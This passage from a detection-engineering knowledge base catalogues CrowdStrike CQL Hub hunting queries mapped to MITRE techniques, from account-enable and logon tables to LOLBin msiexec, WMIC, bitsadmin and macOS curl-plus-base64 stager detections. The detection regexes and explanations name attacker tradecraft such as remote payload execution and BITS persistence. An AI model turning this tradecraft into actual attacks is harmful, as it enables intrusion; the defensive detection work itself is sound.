* Source: CQL Hub (`account_enabled_microsoft_defender_for_identity.yml`), author: Kundan Kumar.
* Original CQL Hub MITRE IDs: T1078.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity; Microsoft Defender for Identity telemetry; Microsoft Defender telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
#Vendor = "microsoft"
| #event.module = "defender-identity"
| Vendor.category = "AdvancedHunting-IdentityDirectoryEvents"
| event.action = "account enabled"
| #event.outcome = "success"
| table([@timestamp,user.name,user.target.name,Vendor.properties.AccountUpn,Vendor.properties.TargetAccountUpn])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Detects when a previously disabled user account is re‑enabled in Active Directory. While this may be part of normal administrative activity, it can also indicate an attempt to restore access to an account for unauthorized use and should be reviewed.
* Key Indicators: Review query output fields and filters from `account_enabled_microsoft_defender_for_identity.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1078]] - Valid Accounts — CQL Hub: Active Directory Activity

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: active_directory_activity.yml
> cql_hub_name:: Active Directory Activity
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1078, T1098
> related_mitre_ids:: T1078, T1098
> required_modules:: Identity
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: Table of recent Active Directory activity including disabled, deleted and password reset events.

* Telemetry Requirements: Identity
* Source: CQL Hub (`active_directory_activity.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1078, T1098.
* Related/Resolved MITRE IDs: T1078, T1098.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity. Validate that this telemetry/module exists in the environment before operational use.

```cql
name=ActiveDirectoryAudit*
| setField(target="ActiveDirectoryAuditActionType", value=if(ActiveDirectoryAuditActionType == 4,
then="GROUP_MEMBER_ADDED", else=(if(ActiveDirectoryAuditActionType == 0,
then="CREATED", else=(if(ActiveDirectoryAuditActionType == 1,
then="DELETED", else=(if(ActiveDirectoryAuditActionType == 2,
then="MODIFIED", else=(if(ActiveDirectoryAuditActionType == 8,
then="GROUP_MEMBER_REMOVED", else=(if(ActiveDirectoryAuditActionType == 16,
then="PASSWORD_CHANGE", else=(if(ActiveDirectoryAuditActionType == 32,
then="PASSWORD_RESET", else=(if(ActiveDirectoryAuditActionType == 64,
then="ENABLED", else=(if(ActiveDirectoryAuditActionType == 128, then="DISABLED", else=(if(ActiveDirectoryAuditActionType == 256, then="LOCKED",
else=(if(ActiveDirectoryAuditActionType == 512, then="UNLOCKED", else=(UNKNOWN)))))))))))))))))))))))
|
groupBy([@timestamp,ActiveDirectoryAuditActionType,ComputerName,TargetDomainControllerHostName,DetectName,Severity,AddedPrivileges,GroupMemberAccountName,PerformedOnAccountName,PerformedByAccountObjectName]) | sort(@timestamp, limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `active_directory_activity.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1078]] - Valid Accounts — CQL Hub: Detection of Generic User Account Usage

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: detection_of_generic_user_account_usage.yml
> cql_hub_name:: Detection of Generic User Account Usage
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1078
> related_mitre_ids:: T1078
> required_modules:: Insight
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query identifies the use of generic or shared user accounts by leveraging a predefined lookup file containing known default and non-personalized usernames (e.g., admin, test, root).

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`detection_of_generic_user_account_usage.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1078.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=UserLogon
| UserName=*
| user_name := lower(UserName)
| groupBy([user_name, ComputerName], function=count(as=LogonCount), limit=20000)
| match(file="generic-usernames.csv", field=user_name, column=username, ignoreCase=true, strict=false)
| User := rename(user_name)
| Host := rename(ComputerName)
| table([User, Host, LogonCount], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: | Framework     | Primary Reason                     | Specific Source / Control            | |---------------|----------------------------------|-------------------------------------| | PCI DSS       | Individual Accountability         | Requirement 8.2.1                   | | HIPAA         | Traceability of PHI Access        | 45 CFR § 164.312(a)(2)(i)           | | ISO 27001     | Privileged Access Control         | Annex A 5.15 / 8.2                  | | NIST 800-53   | Risk Management                  | AC-2(9)                             | | SOC 2         | Auditability                      | CC6.1                               |
* Key Indicators: Review query output fields and filters from `detection_of_generic_user_account_usage.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1078]] - Valid Accounts — CQL Hub: User Logoff Activity

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: user_logoff_activity.yml
> cql_hub_name:: User Logoff Activity
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1078
> related_mitre_ids:: T1078
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: Table of all UserLogoff events including UserName, ComputerName, aip, LocalIP and Domain.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`user_logoff_activity.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1078.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=UserLogoff
| groupBy([UserName, name, aid, aip, ComputerName, event_platform, LocalIP, LogonDomain, LogonServer, LogonType], function=[count(@timestamp), selectLast([@timestamp])])
| table([@timestamp, UserName, ComputerName, aid, aip, event_platform, LocalIP, LogonDomain, LogonType], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `user_logoff_activity.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1078]] - Valid Accounts — CQL Hub: User Logon Activity

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: user_logon_activity.yml
> cql_hub_name:: User Logon Activity
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1078
> related_mitre_ids:: T1078
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: Table of all user logons.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`user_logon_activity.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1078.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=UserLogon
| groupBy([UserName, name, aid, aip, ComputerName, event_platform, LocalIP, LogonDomain, LogonServer, LogonType], function=[count(@timestamp), selectLast([@timestamp])])
| table([@timestamp, UserName, ComputerName, aid, aip, event_platform, LocalIP, LogonDomain, LogonType], limit=20000)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `user_logon_activity.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1218.007]] - Msiexec — CQL Hub: LOLBin Msiexec

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.007
> technique_name:: Msiexec
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: LOLBin_Msiexec.yml
> cql_hub_name:: LOLBin Msiexec
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1218.007
> related_mitre_ids:: T1218.007
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects the use of Msiexec.exe.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`LOLBin_Msiexec.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1218.007.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(#event_simpleName, values=["ProcessRollup2","ProcessBlocked"])
| event_platform=Win and ImageFileName=/msiexec.exe/i and CommandLine=/http/i

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Msiexec.exe – A Windows Installer utility that executes MSI packages or DLLs (including remote or transformed payloads), frequently misused by attackers for stealthy code execution and application control bypass.  [LOLBAS - Msiexec.exe](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)
* Key Indicators: Review query output fields and filters from `LOLBin_Msiexec.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1218]] - System Binary Proxy Execution — CQL Hub: LOLBin WMIC

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218
> technique_name:: System Binary Proxy Execution
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: LOLBin_WMIC.yml
> cql_hub_name:: LOLBin WMIC
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1218, T1105, T1564.004
> related_mitre_ids:: T1218, T1105, T1564.004
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects the use of WMIC.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`LOLBin_WMIC.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1218, T1105, T1564.004.
* Related/Resolved MITRE IDs: T1218, T1105, T1564.004.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(#event_simpleName, values=["ProcessRollup2","ProcessBlocked"])
| event_platform=Win and ImageFileName=/wmic.exe/i

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Wmic.exe – A built-in Windows tool for scripting and remote system management, which adversaries exploit to run commands, load executables via alternate data streams, execute remote or XSL-formatted payloads, and move files stealthily.  [LOLBAS - Wmic.exe](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
* Key Indicators: Review query output fields and filters from `LOLBin_WMIC.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1197]] - BITS Jobs — CQL Hub: Hunting Bitsadmin usage

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1197
> technique_name:: BITS Jobs
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: hunting_bitsadmin_usage.yml
> cql_hub_name:: Hunting Bitsadmin usage
> cql_hub_author:: Oussama AZRARA
> cql_hub_mitre_ids:: T1197
> related_mitre_ids:: T1197
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query implements a multi-hypothesis threat hunting workflow to detect abuse of the Windows Background Intelligent Transfer Service (BITS). It uses a case statement to classify incoming telemetry into four distinct detection hypotheses.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`hunting_bitsadmin_usage.yml`), author: Oussama AZRARA.
* Original CQL Hub MITRE IDs: T1197.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
| case {
    #event_simpleName=ProcessRollup2
    AND (ImageFileName=/\\bitsadmin\.exe$/i OR OriginalFilename="bitsadmin.exe")
    AND (
        CommandLine=/\/transfer/i
        OR CommandLine=/\/addfile/i
        OR CommandLine=/\/download/i
        OR CommandLine=/\/SetNotifyCmdLine/i
        OR CommandLine=/\/resume/i
        OR CommandLine=/https?:\/\//i
        OR CommandLine=/ftp:\/\//i
    )
    AND NOT (
        ParentBaseFileName=svchost.exe
        OR ParentBaseFileName=msiexec.exe
    )
    | hunt_hypothesis := "H1_BITSADMIN_DIRECT_EXEC" ;
    #event_simpleName=ScriptControlScanV2 OR #event_simpleName=CommandHistory
    AND (
        ScriptContent=/Start-BitsTransfer/i
        OR ScriptContent=/Import-Module\s+BitsTransfer/i
        OR ScriptContent=/BITS\.IBackgroundCopyManager/i
    )
    AND (
        ScriptContent=/https?:\/\//i
        OR ScriptContent=/\-Source/i
        OR ScriptContent=/\-Destination/i
    )
    | hunt_hypothesis := "H2_POWERSHELL_BITSTRANSFER" ;
    #event_simpleName=ProcessRollup2
    AND (
        CommandLine=/SetNotifyCmdLine/i
        OR CommandLine=/SetMinRetryDelay/i
        OR CommandLine=/SetNoProgressTimeout/i
    )
    AND NOT CommandLine=/Windows.Update/i
    | hunt_hypothesis := "H3_BITS_PERSISTENCE" ;
    #event_simpleName=ProcessRollup2
    AND ImageFileName=/\\bitsadmin\.exe$/i
    AND CommandLine=/getieproxy/i
    | hunt_hypothesis := "H4_BITS_PROXY_RECON" ;
    * | hunt_hypothesis := "NO_MATCH" ;
}
// Exclure les non-matchs
| hunt_hypothesis != "NO_MATCH"
| select([
    @timestamp,
    hunt_hypothesis,
    ComputerName,
    UserName,
    UserSid,
    ImageFileName,
    CommandLine,
    ParentBaseFileName,
    ParentCommandLine,
    ScriptContent,
    SHA256HashData
])
| sort(@timestamp, order=desc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: H1 catches direct execution of bitsadmin.exe with suspicious command-line arguments (such as /transfer, /addfile, /download, /SetNotifyCmdLine, or URLs) while excluding legitimate parent processes like svchost.exe and msiexec.exe. H2 detects PowerShell-based BITS abuse by scanning script block logging and command history events for cmdlets like Start-BitsTransfer or direct COM object invocation (BITS.IBackgroundCopyManager) combined with network-related parameters. H3 focuses specifically on BITS persistence mechanisms by flagging commands that set notification callbacks (SetNotifyCmdLine), retry delays, or timeout values excluding legitimate Windows Update activity. H4 identifies proxy reconnaissance via bitsadmin /getieproxy, a technique attackers use to discover proxy configurations before exfiltrating data.
* Key Indicators: Review query output fields and filters from `hunting_bitsadmin_usage.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1140]] - Deobfuscate/Decode Files or Information — CQL Hub: InstallFix on macOS

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1140
> technique_name:: Deobfuscate/Decode Files or Information
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: installfix_on_macos.yml
> cql_hub_name:: InstallFix on macOS
> cql_hub_author:: Szymon Kozicki
> cql_hub_mitre_ids:: T1140, T1059.004
> related_mitre_ids:: T1140, T1059.004
> required_modules:: Insight
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: The InstallFix query is designed to catch the execution patterns of one-liner stagers or initial access scripts that often masquerade as legitimate system fixes or installers through a high-confidence sequence where a curl command - configured with flags typically used to bypass security or silence output - is executed in close temporal proximity (within 1 minute) to a command involving Base64 decoding.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`installfix_on_macos.yml`), author: Szymon Kozicki.
* Original CQL Hub MITRE IDs: T1140, T1059.004.
* Related/Resolved MITRE IDs: T1140, T1059.004.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; macOS endpoint telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
#repo="base_sensor"
| #event_simpleName="ProcessRollup2"
| event_platform="Mac"
| correlate(
  Base64Decode: {
    #event_simpleName="ProcessRollup2"
    | CommandLine=/(?i)base64\s+-(d|D)/
  } include:[aid],

  SuspiciousCurl: {
    #event_simpleName="ProcessRollup2"
    | CommandLine=/(?i)curl\s+.*https?:\/\//
    | CommandLine=/(?i)curl\s+-[a-z]*[ksfls]{4,}/
    | rootURL := "https://falcon.us-2.crowdstrike.com/"
    | format("[Tree](%sgraphs/process-explorer/tree?id=pid:%s:%s)", field=["rootURL", "aid", "TargetProcessId"], as="URL")
  } include:[ComputerName, UserName, aid, CommandLine, URL],
  within=1m,
  sequence=true,
  globalConstraints=[aid],
  includeMatchesOnceOnly=true
)
| ComputerName            := SuspiciousCurl.ComputerName
| aid           := SuspiciousCurl.aid
| @timestamp         := SuspiciousCurl.@timestamp
| Tree           := SuspiciousCurl.URL
| UserName            := SuspiciousCurl.UserName
| Curl_CMD := SuspiciousCurl.CommandLine
| table([@timestamp, UserName, ComputerName, aid, Tree, Curl_CMD])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `installfix_on_macos.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.
